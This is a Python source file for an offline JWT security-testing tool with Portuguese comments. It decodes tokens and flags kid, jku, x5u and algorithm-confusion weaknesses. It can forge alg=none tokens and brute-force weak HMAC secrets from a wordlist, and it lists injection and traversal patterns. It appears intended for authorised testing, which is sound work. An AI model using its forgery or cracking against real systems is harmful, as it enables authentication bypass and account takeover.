"""dma jwt_tool: analise OFFLINE de JWT. Nunca toca rede.

  decode   - mostra header/payload e flags de vetor (kid, jku, x5u, alg)
  --none   - gera variante alg=none do token (string, para uso gated)
  --brute  - brute LOCAL de segredo fraco HMAC numa copia do token.
             Wordlist pequena e focada; resultado sai mascarado.

Uso:
  python jwt_tool.py <token>
  python jwt_tool.py <token> --none
  python jwt_tool.py <token> --brute wordlist.txt
"""
import argparse
import base64
import hashlib
import hmac
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import mask, die  # noqa: E402

ALG_HASH = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
            "HS512": hashlib.sha512}
INJECTION_HINTS = ("../", "..\\", "|", ";", "dev/null", "%00")


def b64d(seg):
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def b64e(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def analyze(token):
    parts = token.strip().split(".")
    if len(parts) != 3:
        die("token nao tem 3 segmentos — nao e JWT compacto")
    try:
        header = json.loads(b64d(parts[0]))
        payload = json.loads(b64d(parts[1]))
        sig = b64d(parts[2])
    except (ValueError, UnicodeDecodeError) as e:
        die(f"segmento nao e base64/JSON valido: {e}")
    if not isinstance(header, dict) or not isinstance(payload, dict):
        die("header/payload do token nao sao objetos JSON")
    alg = str(header.get("alg", ""))
    flags = []
    if alg.lower() == "none":
        flags.append("alg=none JA EM USO")
    elif alg in ALG_HASH:
        flags.append(f"{alg}: HMAC, segredo fraco brute-avel localmente")
    elif alg.startswith("RS") or alg.startswith("ES") or alg.startswith("PS"):
        flags.append(f"{alg}: superficie de confusao alg->HS256 "
                     "(precisa da chave publica do alvo como secret)")
    for k in ("kid", "jku", "x5u", "x5t", "cty"):
        if k in header:
            v = str(header[k])
            flags.append(f"header {k}={v}")
            if k == "kid" and any(h in v for h in INJECTION_HINTS):
                flags.append("  kid com cara de injection/traversal")
            if k in ("jku", "x5u"):
                flags.append("  URL de chave controlavel? candidato gated")
    if not sig:
        flags.append("assinatura vazia")
    return header, payload, sig, alg, flags


def forge_none(payload):
    h = b64e(json.dumps({"alg": "none", "typ": "JWT"},
                        separators=(",", ":")).encode())
    p = b64e(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def brute(parts, alg, sig, wordlist):
    hm = ALG_HASH.get(alg)
    if not hm:
        die(f"alg {alg} nao e HMAC — brute so cobre HS256/384/512")
    signing = f"{parts[0]}.{parts[1]}".encode()
    tried = 0
    with open(wordlist, encoding="utf-8", errors="replace") as fh:
        for line in fh:
            cand = line.strip()
            if not cand:
                continue
            tried += 1
            dig = hmac.new(cand.encode(), signing, hm).digest()
            if hmac.compare_digest(dig, sig):
                return cand, tried
    return None, tried


def main():
    ap = argparse.ArgumentParser(description="dma jwt_tool (offline)")
    ap.add_argument("token")
    ap.add_argument("--none", action="store_true",
                    help="emite variante alg=none (string)")
    ap.add_argument("--brute", metavar="WORDLIST",
                    help="brute local de segredo HMAC")
    a = ap.parse_args()

    header, payload, sig, alg, flags = analyze(a.token)
    print("[jwt] header:", json.dumps(header, ensure_ascii=False))
    print("[jwt] payload:", json.dumps(payload, ensure_ascii=False))
    print(f"[jwt] sig {len(sig)}b | alg={alg}")
    for f in flags:
        print(f"  ! {f}")

    if a.none:
        print("[jwt] variante alg=none (gated — usar so com aprovacao):")
        print("  " + forge_none(payload))

    if a.brute:
        found, tried = brute(a.token.split("."), alg, sig, a.brute)
        print(f"[jwt] brute: {tried} candidatos testados (local)")
        if found:
            print(f"  SEGREDO FRACO CONFIRMADO: {mask(found)} "
                  "— registrar em findings sem valor claro")
        else:
            print("  nenhum candidato bateu")

    return 0


if __name__ == "__main__":
    sys.exit(main())
